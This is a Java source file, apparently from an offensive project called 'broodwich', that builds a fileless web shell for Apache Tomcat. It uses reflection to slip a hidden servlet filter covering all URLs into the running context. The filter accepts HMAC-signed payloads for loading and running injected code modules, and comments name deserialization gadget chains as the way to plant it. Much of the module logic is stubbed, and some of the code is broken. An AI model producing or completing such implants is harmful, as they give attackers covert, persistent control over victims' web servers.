package party.itistimeto.broodwich;

// note: java 7+ lang level currently
// todo: test various exploit methods
// for starters, commons collections 4, groovy, ognl, maybe orange tsai jenkins
// todo: see if we actually can't use imports
// todo: test on java 9+

// todo: at minimum also jetty
// preferred third option probably wildfly (or undertow?), four weblogic

public class Dropper implements javax.servlet.Filter {
    private final java.lang.String macAlgo = "HmacSHA256";
    private final String digestKey = "broodwichDigest";
    private final String moduleIdKey = "broodwichModuleId";
    private final String modulesAttribute = "modules";
    private final String runPayloadMethodName = "runPayload";
    private javax.crypto.SecretKey secretKey;
    private final java.lang.String payloadKey = "broodwichCommand";

    public static void taste(javax.servlet.http.HttpServlet servlet, byte[] key) {
        java.lang.String filterName = "broodwich";
        javax.servlet.ServletContext contextFacade = servlet.getServletContext();
        if (!contextFacade.getFilterRegistrations().containsKey(filterName)) {
            try {
                // reflection magic
                // 1. we need to manipulate the StandardContext, so we have to grab the ApplicationContext
                // field from the ApplicationContextFacade returned by getServletContext, then ask it for
                // the StandardContext
                // TODO: test on earlier tomcat versions
                java.lang.reflect.Field contextField = servlet.getServletContext().getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                org.apache.catalina.core.ApplicationContext context = (org.apache.catalina.core.ApplicationContext) contextField.get(contextFacade);
                java.lang.reflect.Method getContextMethod = context.getClass().getDeclaredMethod("getContext");
                getContextMethod.setAccessible(true);
                org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getContextMethod.invoke(context);
                // 2. to add the filter, we need to use StandardContext's public methods addFilterDef and
                // addFilterMap, as well as manipulate its filterConfigs map directly; filter configs require
                // use of a protected constructor
                java.lang.reflect.Constructor afcConstructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, org.apache.tomcat.util.descriptor.web.FilterDef.class);
                afcConstructor.setAccessible(true);
                java.lang.reflect.Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);

                // create filter definition
                org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilter(new party.itistimeto.broodwich.Dropper(key));

                // create filter map
                org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
                filterMap.setFilterName(filterName);
                filterMap.addURLPattern("/*");
                // TODO: or should we use "upper" context?
                for(String servletName : standardContext.getServletContext().getServletRegistrations().keySet()) {
                    filterMap.addServletName(servletName);
                }
                filterMap.setDispatcher(javax.servlet.DispatcherType.REQUEST.name());

                // create filter config
                org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) afcConstructor.newInstance(standardContext, filterDef);

                // add definition, map, and config, synchronized on context's config map
                // todo: will this lock requests on high-traffic server? hopefully light enough that it won't
                java.util.Map<String, org.apache.catalina.core.ApplicationFilterConfig> filterConfigs = (java.util.Map<String, org.apache.catalina.core.ApplicationFilterConfig>) filterConfigsField.get(standardContext);
                synchronized (filterConfigsField.get(standardContext)) {
                    // TODO: do we need to use addFilterDef?
                    standardContext.addFilterDef(filterDef);
                    standardContext.addFilterMap(filterMap);
                    filterConfigs.put(filterName, filterConfig);
                }
            } catch (java.lang.ReflectiveOperationException e) {
                e.printStackTrace();
            }
        }
    }

    private Dropper(byte[] secretKey) {
        super();
        this.secretKey = new javax.crypto.spec.SecretKeySpec(secretKey, macAlgo);
    }

    @Override
    public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {
        // todo: concurrent map necessary?
        // todo: store in servlet context or just in this class?
        java.util.concurrent.ConcurrentMap<java.lang.Integer, java.lang.Class> modules = new java.util.concurrent.ConcurrentHashMap<>();
        filterConfig.getServletContext().setAttribute(modulesAttribute, modules);
    }

    @Override
    public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {
        // todo: multipart is only natively supported on servlet 3.0+
        // decide if want to implement alternate method (e.g., apache commons, application/octet-stream)
        javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) servletRequest;
        java.util.Collection<javax.servlet.http.Part> parts = httpServletRequest.getParts();
        if(!parts.isEmpty()) {
            byte[] compressedPayload = null;
            byte[] moduleIdBytes = null;
            int moduleId = -1;
            byte[] digest = null;

            for(javax.servlet.http.Part part : parts) {
                switch (part.getName()) {
                    case payloadKey:
                        new java.io.DataInputStream(part.getInputStream()).readFully(compressedPayload);
                        break;
                    case moduleIdKey:
                        new java.io.DataInputStream(part.getInputStream()).readFully(moduleIdBytes);
                        moduleId = moduleIdBytes[0];
                        break;
                    case digestKey:
                        new java.io.DataInputStream(part.getInputStream()).readFully(digest);
                        break;
                }
            }

            if(compressedPayload != null && moduleId != -1 && digest != null) {
                try {
                    javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlgo);
                    mac.init(secretKey);
                    byte[] computedDigest = mac.doFinal(compressedPayload);

                    // todo: timing attacks etc.
                    if(computedDigest.equals(digest)) {
                        // 2. ungzip payload
                        byte[] payload = compressedPayload; // stub

                        javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
                        java.util.concurrent.ConcurrentMap<java.lang.Integer, java.lang.Class> modules = (java.util.concurrent.ConcurrentMap<java.lang.Integer, java.lang.Class>) servletRequest.getAttribute(modulesAttribute);

                        if(moduleId == 0) {
                            // todo: determine module api
                            // probably: payload, request, response, shared buffer
                            // 1. load class from bytecode
                            // todo: change module id to fully-qualified class name
                            // 2. confirm api conformance
                            // 3. add to modules map
                        }
                        else {
                            java.lang.Class clazz = modules.get(moduleId);
                            if (clazz != null) {
                                // 1. invoke method
                            }
                        }
                    }
                } catch (java.security.NoSuchAlgorithmException | java.security.InvalidKeyException e) {
                    e.printStackTrace();
                }
            }
        }

    }

    @Override
    public void destroy() {

    }
}